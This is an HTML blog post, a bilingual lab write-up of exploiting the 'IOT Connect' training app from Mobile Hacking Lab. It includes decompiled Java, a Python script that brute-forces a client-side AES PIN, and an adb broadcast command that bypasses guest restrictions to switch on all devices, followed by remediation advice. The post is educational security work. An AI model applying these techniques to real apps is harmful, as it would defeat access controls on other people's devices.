@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Hacking Lab: IOT Connect</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="shortcut icon" href="./assets/public/favicon.svg">
+    <style>
+        #articleContentVi pre,
+        #articleContentEn pre {
+            max-height: 560px;
+        }
+    </style>
+</head>
+<body class="blog-post-page">
+    <header class="head">
+        <div class="main">
+            <a href="./index.html" class="logo" aria-label="Phan Toan home">PHAN TOAN</a>
+            <ul class="menu">
+                <li class="btn" onclick="window.location.href='./index.html'">Home</li>
+                <li class="btn nav" onclick="window.location.href='./blog.html'">Blog</li>
+            </ul>
+            <ul class="menu" id="menu-expand">
+                <li class="btn skin" id="menu-expand-child" aria-label="Toggle navigation">
+                    <i class="icon menu-icon" aria-hidden="true"></i>
+                </li>
+            </ul>
+            <div id="menu-panel" hidden>
+                <ul class="menu-panel-content">
+                    <li class="btn" onclick="window.location.href='./index.html'">Home</li>
+                    <li class="btn nav" onclick="window.location.href='./blog.html'">Blog</li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <main class="blog blog-post-page-content">
+        <section class="hero-section hero-guide hero-guide-iot-connect">
+            <div class="hero-overlay"></div>
+            <div class="hero-content">
+                <div class="hero-kicker">Mobile Pentest</div>
+                <h1 class="hero-title">Mobile Hacking Lab: IOT Connect</h1>
+                <p class="hero-subtitle">
+                    Bilingual writeup on exported broadcast abuse, client-side PIN recovery, and direct <code>MASTER_ON</code> trigger for full device activation.
+                </p>
+            </div>
+        </section>
+
+        <div class="blog-list">
+            <div class="item">
+                <div class="blog-post-meta-row">
+                    <div class="blog-tags">
+                        <a class="blog-tag" href="./blog.html?tag=pentest_mobile" data-tag="pentest_mobile">#pentest_mobile</a>
+                        <a class="blog-tag" href="./blog.html?tag=android" data-tag="android">#android</a>
+                        <a class="blog-tag" href="./blog.html?tag=iot" data-tag="iot">#iot</a>
+                        <a class="blog-tag" href="./blog.html?tag=broadcast_receiver" data-tag="broadcast_receiver">#broadcast_receiver</a>
+                    </div>
+
+                    <div class="info blog-meta">
+                        <div class="info-avatar"><img src="./assets/blog/avatar.svg" alt="Author avatar"></div>
+                        <div class="info-name">Phan Toan</div>
+                        <div class="info-time">2026-04-19</div>
+                    </div>
+                </div>
+
+                <div class="blog-post-layout">
+                    <article class="blog-markdown" id="articleContentVi" data-locale-panel="vi" hidden>
+                        <div class="article-locale-top">
+                            <div class="article-locale-switch" role="group" aria-label="Article language switcher">
+                                <button class="article-locale-btn" type="button" data-locale="vi" aria-pressed="false">VI</button>
+                                <button class="article-locale-btn active" type="button" data-locale="en" aria-pressed="true">EN</button>
+                            </div>
+                        </div>
+
+<h1 id="vi-mobile-hacking-lab-iot-connect">Mobile Hacking Lab: IOT Connect</h1>
+<p><strong>Ref: <a href="https://www.mobilehackinglab.com/course/lab-iot-connect">Mobile Hacking Lab: IOT Connect</a></strong></p>
+<p><em>Mục tiêu:</em> Mục tiêu của lab là khai thác lỗ hổng <code>Broadcast Receiver</code> trong ứng dụng IOT Connect để kích hoạt <code>master switch</code> và bật toàn bộ thiết bị theo cách mà người dùng guest không thể thực hiện qua giao diện bình thường.</p>
+<h2 id="vi-phan-tich-tinh">Phân tích tĩnh</h2>
+<p>Sử dụng công cụ <code>JADX GUI</code> để dịch ngược mã nguồn, sau đó chúng ta cùng kiểm tra mã nguồn.</p>
+<p>Kiểm tra trong <code>AndroidManifest.xml</code> ta thấy xuất hiện các <code>receiver</code> được bật <code>export=true</code> rất đáng nghi ngờ</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img.png" alt="img.png" /></figure>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_1.png" alt="img_1.png" /></figure>
+<p>Tuy nhiên tại receiver <code>ProfileInstallReceiver</code> mặc dù có <code>export=true</code> nhưng vẫn yêu cầu có quyền hạn để gửi được broadcast, kiểm thử tìm kiếm xem quyền <code>DUMP</code> có được định nghĩa trong hệ thống không?</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_2.png" alt="img_2.png" /></figure>
+<p>Kết quả tìm kiếm cho thấy, đây là một quyền không được định nghĩa hoặc code đã obfucaste làm không thể phát hiện được, tạm thời bỏ qua. Tiếp tục quan sát vào receiver <code>MasterReceiver</code> thấy không yêu cầu quyền mà vẫn có thể truy cập được. Thử tìm kiếm chuỗi <code>MasterReceiver</code> trong mã nguồn</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_3.png" alt="img_3.png" /></figure>
+<p>Kiểm tra thấy hàm <code>onReceiver</code> của <code>MasterReceiver</code> được xử lý trong <code>MasterReceiver</code>. Từ mã nguồn này ta thấy receiver động này không yêu cầu permission và không kiểm tra caller gửi broadcast. Một điểm quan trọng nữa là receiver động được khởi tạo từ các activity thông thường</p>
+<pre><code class="language-java">CommunicationManager.INSTANCE.initialize(this);
+</code></pre>
+<p>Vì <code>LoginActivity</code> là activity export ra ngoài nên acttacker có thể mở activity này trước để cho receiver hoạt động</p>
+<pre><code class="language-manifest">&lt;activity
+    android:name=&quot;com.mobilehackinglab.iotconnect.LoginActivity&quot;
+    android:exported=&quot;true&quot;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+</code></pre>
+<p>Phân tích luồng xử lý khi nhận action <code>MASTER_ON</code></p>
+<p>Trong <code>CommunicationManager.initialize(...)</code>, receiver động sẽ kiểm tra action <code>MASTER_ON</code>, lấy key từ intent, rồi xác thực bằng <code>Checker.check_key(key)</code>.</p>
+<pre><code class="language-java">public void onReceive(Context context2, Intent intent) {
+    if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, &quot;MASTER_ON&quot;)) {
+        int key = intent.getIntExtra(&quot;key&quot;, 0);
+        if (context2 != null) {
+            if (Checker.INSTANCE.check_key(key)) {
+                CommunicationManager.INSTANCE.turnOnAllDevices(context2);
+                Toast.makeText(context2, &quot;All devices are turned on&quot;, 1).show();
+            } else {
+                Toast.makeText(context2, &quot;Wrong PIN!!&quot;, 1).show();
+            }
+        }
+    }
+}
+
+</code></pre>
+<p>Trong hàm <code>turnOnAllDevices()</code></p>
+<pre><code class="language-java">public final void turnOnAllDevices(Context context) {
+    Log.d(&quot;TURN ON&quot;, &quot;Turning all devices on&quot;);
+    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);
+    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);
+    turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);
+    turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);
+    turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);
+    turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);
+    turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);
+}
+</code></pre>
+<p>Kiểm tra hai đoạn mã thì kết luận để kích hoạt được <code>turnOnAllDevices()</code> thì yêu cầu gửi được action <code>MASTER_ON</code> với key đúng và không có yêu cầu nào về quyền <code>guest</code> trong <code>onReceive()</code>.</p>
+<p>Kiểm tra hàm xử lý mã Pin</p>
+<p>Việc kiểm tra mã PIN được nằm hoàn toàn trong client side code</p>
+<pre><code class="language-java">private static final String algorithm = &quot;AES&quot;;
+private static final String ds = &quot;OSnaALIWUkpOziVAMycaZQ==&quot;;
+
+public final boolean check_key(int key) {
+    try {
+        return Intrinsics.areEqual(decrypt(ds, key), &quot;master_on&quot;);
+    } catch (BadPaddingException e) {
+        return false;
+    }
+}
+</code></pre>
+<p>Key được sinh trực tiếp từ số PIN bằng cách chuyển PIN thành chuỗi byte rồi copy vào mảng 16 byte.</p>
+<pre><code class="language-java">private final SecretKeySpec generateKey(int staticKey) {
+    byte[] keyBytes = new byte[16];
+    byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
+    System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
+    return new SecretKeySpec(keyBytes, algorithm);
+}
+</code></pre>
+<p>Cipher được tạo bằng <code>AES/ECB/PKCS5Padding</code> và decrypt trực tiếp ciphertext hardcode.</p>
+<pre><code class="language-java">SecretKeySpec secretKey = generateKey(key);
+Cipher cipher = Cipher.getInstance(algorithm + &quot;/ECB/PKCS5Padding&quot;);
+cipher.init(2, secretKey);
+byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
+return new String(decryptedBytes, Charsets.UTF_8);
+</code></pre>
+<p>Mã nguồn thu thập được <code>alg</code>, <code>cipher</code>, thuật toán mã hóa, cách sinh key từ PIN, plaintext mong đợi là <code>master_on</code>. Khi có đầy đủ thì ta thực hiện brute-force để giải mã tìm giá trị PIN đúng.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64
+import subprocess
+
+DS = &quot;OSnaALIWUkpOziVAMycaZQ==&quot;
+TARGET = b&quot;master_on&quot;
+
+
+def generate_key_hex(pin: int) -&gt; str:
+    key = bytearray(16)
+    pin_bytes = str(pin).encode(&quot;utf-8&quot;)
+    key[: min(len(pin_bytes), 16)] = pin_bytes[:16]
+    return key.hex()
+
+
+def check_pin(pin: int) -&gt; bool:
+    result = subprocess.run(
+        [
+            &quot;openssl&quot;,
+            &quot;enc&quot;,
+            &quot;-d&quot;,
+            &quot;-aes-128-ecb&quot;,
+            &quot;-K&quot;,
+            generate_key_hex(pin),
+        ],
+        input=base64.b64decode(DS),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+        check=False,
+    )
+    return result.returncode == 0 and result.stdout == TARGET
+
+
+for pin in range(1_000_000):
+    if check_pin(pin):
+        print(f&quot;[+] PIN found: {pin}&quot;)
+        break
+else:
+    print(&quot;[-] PIN not found&quot;)
+
+</code></pre>
+<p>Thực hiện chạy mã nguồn và thu được kết quả</p>
+<pre><code class="language-commandline">[+] PIN found: 345
+</code></pre>
+<p>Vậy đã có mã PIN hợp lệ là <code>345</code>.</p>
+<h2 id="vi-phan-tich-ong">Phân tích động</h2>
+<p>Trước tiên hãy tải và cài đặt mã nguồn vào trong thiết bị android của bạn trước</p>
+<pre><code class="language-commandline">adb install com.mobilehackinglab.iotconnect.apk
+</code></pre>
+<p>Mở app lên và trải nghiệm xem có gì tiếp theo. Thực hiện đăng kí và đăng nhập bình thường</p>
+<figure><img alt="img_4.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_4.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Sau khi truy cập rồi vào <code>Set up</code></p>
+<figure><img alt="img_5.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_5.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Nhiệm vụ của chúng ta cần thực hiện broadcast receive để bật toàn bộ thiết bị lên, nhưng tại sao không bật thủ công luôn cho nhanh nhỉ :) <em>(Thử xem)</em></p>
+<figure><img alt="img_6.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_6.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Nhận được thông báo lỗi <code>Sorry, guest ...</code> đại khái là chúng ta không phải admin nên không được phép bật :). Được rồi truy cập ra tính năng  <code>Master Switch</code>, chúng ta thấy giao diện cho phép nhập mã pin và mã PIN vừa tìm được là <code>345</code> hãy thử xem</p>
+<figure><img alt="img_7.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_7.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Chúng ta lại tiếp tục nhận được lỗi tương tự không được phép truy cập từ tài khoản guest. Truy cập lại phần xử lý logic phần này kiểm tra xem!</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_8.png" alt="img_8.png" /></figure>
+<p>Đoạn cần tìm nằm trong mã nguồn <code>MasterSwitchActivity</code></p>
+<pre><code class="language-java">// onCreate(..)
+ button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.iotconnect.MasterSwitchActivity$$ExternalSyntheticLambda0
+    @Override // android.view.View.OnClickListener
+    public final void onClick(View view) {
+        MasterSwitchActivity.onCreate$lambda$0(user, this, view);
+    }
+});
+//
+public static final void onCreate$lambda$0(User user, MasterSwitchActivity this$0, View it) {
+        Intrinsics.checkNotNullParameter(user, &quot;$user&quot;);
+        Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;);
+        if (user.isGuest() != 1) {
+            EditText editText = this$0.pin_edt;
+            if (editText == null) {
+                Intrinsics.throwUninitializedPropertyAccessException(&quot;pin_edt&quot;);
+                editText = null;
+            }
+            String pinText = StringsKt.trim((CharSequence) editText.getText().toString()).toString();
+            if (pinText.length() &gt; 0) {
+                int pin = Integer.parseInt(pinText);
+                Intent intent = new Intent(&quot;MASTER_ON&quot;);
+                intent.putExtra(&quot;key&quot;, pin);
+                LocalBroadcastManager.getInstance(this$0).sendBroadcast(intent);
+                return;
+            }
+            Toast.makeText(this$0, &quot;Please enter a PIN&quot;, 0).show();
+            return;
+        }
+        Toast.makeText(this$0, &quot;Sorry, the masterswitch can't be controlled by guests&quot;, 0).show();
+    }
+</code></pre>
+<p>Từ đó chúng ta suy ra rằng hệ thống chỉ giới hạn <code>Guest</code> chỉ nằm ở UI, chỉ kiểm tra bằng <code>user.isGuest() != 1</code> ở UI.
+Vậy từ điểm nhận broadcast được <code>export=true</code> thì ta có thể sử dụng <code>adb am</code> để thực hiện</p>
+<h2 id="vi-poc-exploit">PoC Exploit</h2>
+<ul>
+<li>Từ phân tích tĩnh ta đã thu thập được mã PIN là: 345</li>
+<li>Action để kích hoạt &quot;MASTER_ON&quot; và extra là &quot;key&quot;</li>
+</ul>
+<p>Chỉ cần gửi action <code>MASTER_ON</code> kèm <code>key=345</code> là sẽ đi thẳng vào <code>onReceive()</code> và kích hoạt <code>turnOnAllDevices(...)</code>.</p>
+<pre><code class="language-commandline">adb shell am broadcast -a MASTER_ON --ei key 345
+</code></pre>
+<p>Kiểm tra kết quả nhận được thông báo</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_9.png" alt="img_9.png" /></figure>
+<p>Đăng nhập và kiểm tra các thiết bị</p>
+<figure><img alt="img_10.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_10.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Các thiết bị mà trước đó <code>guest</code> không bật được thì giờ đây đã bật được toàn bộ. Exploit thành công</p>
+<h2 id="vi-ket-luan">Kết luận</h2>
+<ol>
+<li><p>Tác động</p>
+<ul>
+<li>Lỗ hổng này cho phép attacker bỏ qua hạn chế dành cho guest và điều khiển master switch, dẫn tới việc bật toàn bộ thiết bị được quản lý bởi ứng dụng.</li>
+<li>Đây là lỗi kiểm soát truy cập do tin tưởng dữ liệu broadcast từ bên ngoài trong khi chỉ áp dụng kiểm tra phân quyền ở UI.</li>
+</ul>
+</li>
+<li><p>Nguyên nhân gốc rễ</p>
+<ul>
+<li>Nguyên nhân gốc rễ gồm hai phần:<ul>
+<li>Broadcast path cho action <code>MASTER_ON</code> không được bảo vệ bằng permission hoặc xác thực caller.</li>
+<li>Cơ chế xác thực PIN nằm hoàn toàn ở client-side và có thể đảo ngược hoặc brute-force từ mã nguồn.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Khuyến nghị khắc phục</p>
+<ul>
+<li>Không export receiver xử lý <code>MASTER_ON</code> nếu chỉ dùng nội bộ.</li>
+<li>Nếu buộc phải export, phải gắn permission mức signature hoặc kiểm tra caller một cách phù hợp.</li>
+<li>Không dùng <code>registerReceiver(...)</code> toàn cục cho luồng điều khiển nhạy cảm mà không ràng buộc <code>permission</code>.</li>
+<li>Không đặt logic xác thực PIN hoàn toàn ở client-side.</li>
+<li>Di chuyển kiểm tra quyền người dùng khỏi UI và đặt tại điểm xử lý thực tế của hành động nhạy cảm.</li>
+</ul>
+</li>
+</ol>
+<p><em>Ứng dụng IOT Connect chứa lỗ hổng Broadcast Receiver dẫn tới bypass hạn chế guest. Bằng cách phân tích mã nguồn, suy ra PIN 345, và gửi broadcast <code>MASTER_ON</code> trực tiếp tới luồng xử lý không được bảo vệ, attacker có thể bật toàn bộ thiết bị mà không cần đi qua luồng UI hợp lệ dành cho người dùng không phải guest.</em></p>
+
+                    </article>
+
+                    <article class="blog-markdown" id="articleContentEn" data-locale-panel="en">
+                        <div class="article-locale-top">
+                            <div class="article-locale-switch" role="group" aria-label="Article language switcher">
+                                <button class="article-locale-btn" type="button" data-locale="vi" aria-pressed="false">VI</button>
+                                <button class="article-locale-btn active" type="button" data-locale="en" aria-pressed="true">EN</button>
+                            </div>
+                        </div>
+
+<h1 id="en-mobile-hacking-lab-iot-connect">Mobile Hacking Lab: IOT Connect</h1>
+<p><strong>Ref: <a href="https://www.mobilehackinglab.com/course/lab-iot-connect">Mobile Hacking Lab: IOT Connect</a></strong></p>
+<p><em>Objective:</em> The lab objective is to exploit a <code>Broadcast Receiver</code> vulnerability in the IOT Connect app to trigger the <code>master switch</code> and turn on all devices in a way that a guest user cannot do through the normal UI flow.</p>
+<h2 id="en-static-analysis">Static Analysis</h2>
+<p>Use <code>JADX GUI</code> to reverse the source code, then inspect the code paths.</p>
+<p>In <code>AndroidManifest.xml</code>, we can see several <code>receiver</code> components with <code>export=true</code>, which is suspicious.</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img.png" alt="img.png" /></figure>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_1.png" alt="img_1.png" /></figure>
+<p>However, for <code>ProfileInstallReceiver</code>, although it has <code>export=true</code>, it still requires a permission to send a broadcast. Test whether the <code>DUMP</code> permission is defined in the system.</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_2.png" alt="img_2.png" /></figure>
+<p>The search result shows this permission is not defined, or the code is obfuscated and cannot be identified clearly, so skip it for now. Continue with <code>MasterReceiver</code>, which does not require any permission and is still reachable. Search for the <code>MasterReceiver</code> string in the source.</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_3.png" alt="img_3.png" /></figure>
+<p>We can see the receiver handling path is in <code>MasterReceiver.onReceive</code>. From this code, this dynamic receiver does not require permission and does not verify the caller sending the broadcast. Another key point: this dynamic receiver is initialized from normal activities.</p>
+<pre><code class="language-java">CommunicationManager.INSTANCE.initialize(this);
+</code></pre>
+<p>Since <code>LoginActivity</code> is exported, an attacker can launch this activity first so the receiver becomes active.</p>
+<pre><code class="language-manifest">&lt;activity
+    android:name=&quot;com.mobilehackinglab.iotconnect.LoginActivity&quot;
+    android:exported=&quot;true&quot;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+</code></pre>
+<p>Analyze the processing flow for action <code>MASTER_ON</code>.</p>
+<p>In <code>CommunicationManager.initialize(...)</code>, the dynamic receiver checks action <code>MASTER_ON</code>, reads the key from the intent, then validates it via <code>Checker.check_key(key)</code>.</p>
+<pre><code class="language-java">public void onReceive(Context context2, Intent intent) {
+    if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, &quot;MASTER_ON&quot;)) {
+        int key = intent.getIntExtra(&quot;key&quot;, 0);
+        if (context2 != null) {
+            if (Checker.INSTANCE.check_key(key)) {
+                CommunicationManager.INSTANCE.turnOnAllDevices(context2);
+                Toast.makeText(context2, &quot;All devices are turned on&quot;, 1).show();
+            } else {
+                Toast.makeText(context2, &quot;Wrong PIN!!&quot;, 1).show();
+            }
+        }
+    }
+}
+
+</code></pre>
+<p>Inside <code>turnOnAllDevices()</code>:</p>
+<pre><code class="language-java">public final void turnOnAllDevices(Context context) {
+    Log.d(&quot;TURN ON&quot;, &quot;Turning all devices on&quot;);
+    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);
+    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);
+    turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);
+    turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);
+    turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);
+    turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);
+    turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);
+}
+</code></pre>
+<p>From both code snippets, we can conclude that to trigger <code>turnOnAllDevices()</code>, we only need to send action <code>MASTER_ON</code> with the correct key, and there is no <code>guest</code> permission check in <code>onReceive()</code>.</p>
+<p>Check the PIN handling function.</p>
+<p>PIN verification is entirely implemented in client-side code.</p>
+<pre><code class="language-java">private static final String algorithm = &quot;AES&quot;;
+private static final String ds = &quot;OSnaALIWUkpOziVAMycaZQ==&quot;;
+
+public final boolean check_key(int key) {
+    try {
+        return Intrinsics.areEqual(decrypt(ds, key), &quot;master_on&quot;);
+    } catch (BadPaddingException e) {
+        return false;
+    }
+}
+</code></pre>
+<p>The key is derived directly from the PIN by converting PIN bytes and copying into a 16-byte array.</p>
+<pre><code class="language-java">private final SecretKeySpec generateKey(int staticKey) {
+    byte[] keyBytes = new byte[16];
+    byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
+    System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
+    return new SecretKeySpec(keyBytes, algorithm);
+}
+</code></pre>
+<p>The cipher is created with <code>AES/ECB/PKCS5Padding</code> and decrypts a hardcoded ciphertext directly.</p>
+<pre><code class="language-java">SecretKeySpec secretKey = generateKey(key);
+Cipher cipher = Cipher.getInstance(algorithm + &quot;/ECB/PKCS5Padding&quot;);
+cipher.init(2, secretKey);
+byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
+return new String(decryptedBytes, Charsets.UTF_8);
+</code></pre>
+<p>From the source, we already have <code>alg</code>, <code>cipher</code>, the crypto scheme, key derivation from PIN, and expected plaintext <code>master_on</code>. With these, brute-force can be used to recover the correct PIN.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import base64
+import subprocess
+
+DS = &quot;OSnaALIWUkpOziVAMycaZQ==&quot;
+TARGET = b&quot;master_on&quot;
+
+
+def generate_key_hex(pin: int) -&gt; str:
+    key = bytearray(16)
+    pin_bytes = str(pin).encode(&quot;utf-8&quot;)
+    key[: min(len(pin_bytes), 16)] = pin_bytes[:16]
+    return key.hex()
+
+
+def check_pin(pin: int) -&gt; bool:
+    result = subprocess.run(
+        [
+            &quot;openssl&quot;,
+            &quot;enc&quot;,
+            &quot;-d&quot;,
+            &quot;-aes-128-ecb&quot;,
+            &quot;-K&quot;,
+            generate_key_hex(pin),
+        ],
+        input=base64.b64decode(DS),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+        check=False,
+    )
+    return result.returncode == 0 and result.stdout == TARGET
+
+
+for pin in range(1_000_000):
+    if check_pin(pin):
+        print(f&quot;[+] PIN found: {pin}&quot;)
+        break
+else:
+    print(&quot;[-] PIN not found&quot;)
+
+</code></pre>
+<p>Run the script and get the result.</p>
+<pre><code class="language-commandline">[+] PIN found: 345
+</code></pre>
+<p>So the valid PIN is <code>345</code>.</p>
+<h2 id="en-dynamic-analysis">Dynamic Analysis</h2>
+<p>First, install the APK on your Android device.</p>
+<pre><code class="language-commandline">adb install com.mobilehackinglab.iotconnect.apk
+</code></pre>
+<p>Open the app and test behavior. Register and log in normally.</p>
+<figure><img alt="img_4.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_4.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>After access, go to <code>Set up</code>.</p>
+<figure><img alt="img_5.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_5.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Our task is to send a broadcast to turn on all devices, but why not just turn them on manually first? :) <em>(Try it)</em></p>
+<figure><img alt="img_6.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_6.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>You get an error message like <code>Sorry, guest ...</code>, meaning we are not admin so we cannot enable them. Next, open <code>Master Switch</code>. The UI allows entering a PIN, and we already found PIN <code>345</code>, so try it.</p>
+<figure><img alt="img_7.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_7.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>We still get the same restriction error for guest accounts. Re-check the logic for this feature.</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_8.png" alt="img_8.png" /></figure>
+<p>The relevant code is in <code>MasterSwitchActivity</code>.</p>
+<pre><code class="language-java">// onCreate(..)
+ button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.iotconnect.MasterSwitchActivity$$ExternalSyntheticLambda0
+    @Override // android.view.View.OnClickListener
+    public final void onClick(View view) {
+        MasterSwitchActivity.onCreate$lambda$0(user, this, view);
+    }
+});
+//
+public static final void onCreate$lambda$0(User user, MasterSwitchActivity this$0, View it) {
+        Intrinsics.checkNotNullParameter(user, &quot;$user&quot;);
+        Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;);
+        if (user.isGuest() != 1) {
+            EditText editText = this$0.pin_edt;
+            if (editText == null) {
+                Intrinsics.throwUninitializedPropertyAccessException(&quot;pin_edt&quot;);
+                editText = null;
+            }
+            String pinText = StringsKt.trim((CharSequence) editText.getText().toString()).toString();
+            if (pinText.length() &gt; 0) {
+                int pin = Integer.parseInt(pinText);
+                Intent intent = new Intent(&quot;MASTER_ON&quot;);
+                intent.putExtra(&quot;key&quot;, pin);
+                LocalBroadcastManager.getInstance(this$0).sendBroadcast(intent);
+                return;
+            }
+            Toast.makeText(this$0, &quot;Please enter a PIN&quot;, 0).show();
+            return;
+        }
+        Toast.makeText(this$0, &quot;Sorry, the masterswitch can't be controlled by guests&quot;, 0).show();
+    }
+</code></pre>
+<p>From this, we infer that the <code>Guest</code> restriction exists only at UI level via <code>user.isGuest() != 1</code>.
+So from the exposed broadcast path (<code>export=true</code>), we can use <code>adb am</code> directly.</p>
+<h2 id="en-poc-exploit">PoC Exploit</h2>
+<ul>
+<li>From static analysis, the recovered PIN is: 345</li>
+<li>Action is <code>MASTER_ON</code> and extra is <code>key</code></li>
+</ul>
+<p>Just send action <code>MASTER_ON</code> with <code>key=345</code>, and it goes directly into <code>onReceive()</code> and triggers <code>turnOnAllDevices(...)</code>.</p>
+<pre><code class="language-commandline">adb shell am broadcast -a MASTER_ON --ei key 345
+</code></pre>
+<p>Check the result notification.</p>
+<figure><img src="./assets/public/mobile_hacking_lab_IOT_connect/img_9.png" alt="img_9.png" /></figure>
+<p>Log in and verify the device states.</p>
+<figure><img alt="img_10.png" src="./assets/public/mobile_hacking_lab_IOT_connect/img_10.png" style="width: 320px; max-width: 100%; height: auto;"/></figure>
+<p>Devices that guest could not enable before are now all turned on. Exploit successful.</p>
+<h2 id="en-conclusion">Conclusion</h2>
+<ol>
+<li><p>Impact</p>
+<ul>
+<li>This vulnerability allows an attacker to bypass guest restrictions and control the master switch, resulting in turning on all devices managed by the app.</li>
+<li>This is an access-control flaw caused by trusting externally supplied broadcast data while applying authorization checks only in the UI.</li>
+</ul>
+</li>
+<li><p>Root cause</p>
+<ul>
+<li>The root cause has two parts:<ul>
+<li>The broadcast path for action <code>MASTER_ON</code> is not protected by permission or caller validation.</li>
+<li>PIN validation is fully client-side and can be reversed or brute-forced from the code.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Remediation recommendations</p>
+<ul>
+<li>Do not export the receiver handling <code>MASTER_ON</code> if it is only for internal use.</li>
+<li>If it must be exported, enforce signature-level permission or proper caller validation.</li>
+<li>Do not use global <code>registerReceiver(...)</code> for sensitive control flows without permission constraints.</li>
+<li>Do not keep PIN validation logic entirely on the client side.</li>
+<li>Move user authorization checks out of UI and enforce them at the actual sensitive action handler.</li>
+</ul>
+</li>
+</ol>
+<p><em>The IOT Connect app contains a Broadcast Receiver vulnerability that enables guest-restriction bypass. By analyzing source code, deriving PIN 345, and sending <code>MASTER_ON</code> broadcast directly to an unprotected processing path, an attacker can turn on all devices without following a valid non-guest UI flow.</em></p>
+
+                    </article>
+
+                    <aside class="blog-toc-wrap" aria-label="Table of contents">
+                        <div data-locale-toc="vi" hidden>
+                            <div class="blog-toc-title">Mục lục</div>
+                            <nav class="blog-toc" id="blogTocNavVi">
+                                <a class="toc-link level-1" href="#vi-mobile-hacking-lab-iot-connect">Mobile Hacking Lab: IOT Connect</a>
+                                <a class="toc-link level-1" href="#vi-phan-tich-tinh">Phân tích tĩnh</a>
+                                <a class="toc-link level-1" href="#vi-phan-tich-ong">Phân tích động</a>
+                                <a class="toc-link level-1" href="#vi-poc-exploit">PoC Exploit</a>
